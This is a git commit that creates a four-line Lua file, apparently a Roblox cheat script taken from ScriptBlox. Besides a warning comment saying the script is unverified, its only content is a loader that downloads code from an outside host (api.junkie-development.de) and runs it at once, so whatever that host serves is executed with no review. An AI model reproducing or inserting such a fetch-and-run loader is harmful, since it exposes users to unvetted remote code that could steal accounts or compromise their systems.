0c96e1d7bbb8c4b15c1c42b249d411f7bf8ebe03
quiving405 <orelgames42@gmail.com>
2025-12-25 22:03:12 +0200

    Create rwx.lua

---
+++ rwx.lua
@@ -0,0 +1,4 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/0210f0e75c19e64fb4376073ec3c1084e4c3b799bfeb6cb7670f30ea57fea537/download"))()
